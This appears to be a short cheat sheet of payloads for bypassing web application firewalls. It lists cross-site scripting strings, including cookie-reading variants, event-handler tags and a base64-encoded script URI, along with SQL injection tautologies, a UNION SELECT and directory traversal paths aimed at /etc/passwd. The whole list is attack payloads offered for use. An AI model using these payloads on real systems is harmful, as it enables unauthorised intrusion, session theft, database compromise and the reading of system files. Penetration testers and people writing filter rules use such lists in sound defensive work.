The following are the simple payloads that can be used to bypass WAFs.
> Note: Since these are pretty common, this may not work 100% of the time.
## Cross-Site Scripting
- `prompt('xss')`
- `prompt(8)`
- `confirm('xss')`
- `confirm(8)`
- `alert(/xss/.source)`
- `window[/alert/.source](8)`
- `with(document)alert(cookie)`
- `alert(document['cookie'])`
- `alert(document[/cookie/.source])`
- `alert(document[/coo/.source+kie/.source])`
- `<svg/onload=alert(1)>`
- `<video src=x onerror=alert(1);>`
- `<audio src=x onerror=alert(1);>`
- `javascript:alert(document.cookie)`
- `data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`
## SQL Injection UNION
- `UNION ALL SELECT`
## Blind SQL Injection
- `' or 6=6`
- `' or 0x47=0x47`
- `or char(32)=''`
- `or 6 is not null`
## Directory Traversal
- `/too/../etc/far/../passwd`
- `/etc//passwd`
- `/etc/ignore/../passwd`
- `/etc/passwd.......`